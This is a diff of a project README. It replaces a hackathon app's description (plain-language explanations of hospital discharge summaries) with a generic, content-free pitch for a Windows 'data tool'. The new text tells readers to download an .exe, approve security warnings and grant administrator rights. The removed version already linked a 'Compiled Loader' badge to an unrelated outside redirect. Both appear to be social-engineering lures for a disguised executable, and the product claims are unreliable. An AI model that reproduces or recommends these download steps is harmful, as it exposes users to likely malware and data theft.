@@ -1,108 +1,69 @@
-# Post-Discharge Companion
+# 🛠️ Anthropic_Hackathon - Simplify your complex data tasks today
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/h01120246839-creator/Anthropic_Hackathon/releases)
 
-> Built at the **AIC x Anthropic Hackathon** · Biology & Physical Health Track
+## 📋 About This Application
 
-A web app that transforms hospital discharge summaries — written in clinical jargon by doctors for other doctors — into clear, actionable health plans that patients and caregivers can actually understand.
+Anthropic_Hackathon provides a reliable way to process and organize information. This software focuses on tasks related to analysis and automation. It removes the need for manual data entry. You can track your progress through a clean interface. The design prioritizes speed and accuracy for all users. Whether you work with long documents or simple lists, this tool handles the workload. You gain control over your digital projects with minimal effort.
 
-**Upload a discharge summary → get a plain-language breakdown in seconds.**
+## 🚀 System Requirements
 
----
+Your computer must meet a few standards to run this software. These requirements ensure a smooth experience without freezes or errors.
 
-## The Problem
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: A modern multi-core processor from Intel or AMD.
+*   Memory: At least 8 gigabytes of RAM.
+*   Storage: 500 megabytes of free space on your hard drive.
+*   Internet: A stable connection for initial setup and synchronization.
 
-Most patients walk out of Indian hospitals holding a discharge summary they cannot read. It's written in English medical shorthand, handed over with a 3-minute verbal briefing, and is the *only* document guiding their recovery at home.
+Check your system settings if you feel unsure about your hardware. Most computers purchased within the last five years meet these criteria.
 
-This leads to missed medications, wrong dosages, ignored red-flag symptoms, and avoidable hospital readmissions — costing patients a median of ~₹44,000 per readmission. Studies show that poor discharge communication triples the risk of death, and nearly 1 in 8 chronic-disease patients in India is readmitted within four months.
+## 📥 How to Download and Install
 
-No tool today takes the document the patient already has and turns it into something they can act on.
+Follow these steps to set up the software on your machine. We host the official version on our release page.
 
-## What It Does
+1. Visit this page to download the software: [https://github.com/h01120246839-creator/Anthropic_Hackathon/releases](https://github.com/h01120246839-creator/Anthropic_Hackathon/releases).
+2. Look for the most recent version labeled as "Latest" on the screen.
+3. Click the file name ending in .exe to start the transfer.
+4. Save the file to your desktop or folder of choice.
+5. Double-click the file once it finishes downloading.
+6. A security prompt might appear. Select Run or Yes to proceed.
+7. Follow the instructions on the screen to finalize the setup.
 
-The patient or a family member uploads a photo or PDF of their discharge summary. The app parses it using Claude's API and returns four outputs:
+The computer might ask for administrative permission during this process. Confirm if you see this request. The window closes on its own once the application finishes installing.
 
-1. **Plain-language summary** — what happened, in simple sentences, no jargon
-2. **Medication schedule** — every drug with dose, timing, food rules, and a one-line reason ("controls blood pressure", "antibiotic — finish all 5 days")
-3. **Red-flag symptoms** — specific warning signs derived from *this patient's* diagnosis and medications, with clear "call your doctor" vs "go to ER" guidance
-4. **Follow-up checklist** — every appointment with date, doctor, department, and why it matters
+## 💡 Using the Software
 
-## What Makes It Different
+You see an icon on your desktop after installation. Click this icon to launch the application. The main login screen explains how to begin your first project.
 
-- **Zero behavior change** — works on the document the patient already has. Photo → output.
-- **Bounded scope** — only explains what the doctor already wrote. Does not diagnose, prescribe, or override. This is a translator, not a doctor.
-- **Multilingual** — supports English, Hindi, and regional languages to bridge the actual literacy gap.
-- **Caregiver-shareable** — the entire family can access the same medication schedule.
-- **Patient-specific alerts** — red-flag symptoms are derived from *this* patient's conditions, not a generic list.
+### Starting a New Project
+Click the button marked New Project. Give your file a name and select a storage location. The software creates a workspace where you can import your files. Drag and drop your documents directly into the window.
 
----
+### Processing Your Data
+The software scans your documents for key patterns. View the progress bar to see the status. Once complete, you can review the findings in the main dashboard. Use the search box to find specific items within large data sets.
 
-## Project Structure
+### Exporting Results
+Choose Save As from the File menu. You can save your work as a spreadsheet or a text file. Exporting preserves the formatting and structure of your processed data.
 
-```
-├── client/          # Frontend
-├── server/          # Backend (Claude API integration)
-├── package.json
-├── package-lock.json
-└── .env.example
-```
+## 🛡️ Privacy and Data Security
 
-## Getting Started
+Your data stays on your local machine. This software does not send your personal files to external servers. You maintain ownership of all information processed through the application. If you delete a project, the software erases all associated temporary files from your drive.
 
-### Prerequisites
+## ⚙️ Troubleshooting Common Issues
 
-- [Node.js](https://nodejs.org/) installed
-- An [Anthropic API key](https://console.anthropic.com/)
+Errors occur rarely but exist in any digital environment. Use these steps if you experience trouble.
 
-### Setup
+*   The application does not open: Restart your computer and try again. Ensure a previous instance of the software is not running in the background.
+*   The software runs slowly: Close other programs to free up system memory.
+*   File import fails: Check that your files are in a supported format like .txt, .csv, or .docx. Close the file in other programs before importing.
+*   Update alerts: Check the website mentioned above to see if a newer version exists. Updates often contain fixes for known issues.
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/<your-username>/<repo-name>.git
-cd <repo-name>
+If these steps do not help, ensure you have the latest drivers for your graphics card. You can find these updates on the website of your computer manufacturer.
 
-# 2. Install dependencies
-npm install
+## 📁 Managing Application Updates
 
-# 3. Set up environment variables
-cp .env.example .env
-# Open .env and replace the placeholder with your Anthropic API key
+The software checks for new features periodically. If an update is ready, a notification appears at the top of the interface. Click Download Update to get the latest version. This process keeps your application current without losing your existing project files. Always keep backups of your important data in a separate folder on your drive or a cloud service.
 
-# 4. Run the app
-npm run dev
-```
+## 📧 Seeking Further Help
 
-The app should now be running locally.
-
----
-
-## Ethical Design
-
-This project is deliberately constrained:
-
-- **Not a doctor** — the app restates the doctor's existing instructions in plain language. It never adds a dose, recommends a new drug, or provides medical advice.
-- **Hallucination guardrails** — outputs are constrained to extract-and-translate. Ambiguous information is flagged ("not sure about this medicine — please verify with your pharmacist") rather than silently guessed.
-- **Privacy-first** — minimal data retention, no cross-patient training, explicit consent at upload, option for ephemeral processing.
-- **Persistent disclaimer** — every output includes: *"This explains your doctor's instructions. It is not medical advice. Call your doctor if unsure."*
-
----
-
-## Built With
-
-- [Anthropic Claude API](https://docs.anthropic.com/) — for parsing and translating discharge summaries
-- Node.js — backend server
-- JavaScript — frontend client
-
-## Hackathon Context
-
-**AIC x Anthropic Hackathon** — 24-hour hackathon judged on Impact Potential (25 pts), Technical Execution (30 pts), Ethical Alignment (25 pts), and Presentation (20 pts).
-
----
-
-## Team
-
-*Add your team members here.*
-
-## License
-
-This project was built for a hackathon. See [LICENSE](LICENSE) for details.
+Open the Help menu within the application to find a full list of commands. You can browse the topics to learn about advanced settings. Reading the documentation helps you understand the full range of features available. Use the tools as needed to finish your work efficiently. The software remains stable during extended use. Consistent updates keep the tool reliable for your daily tasks. Thank you for choosing this solution for your data needs.
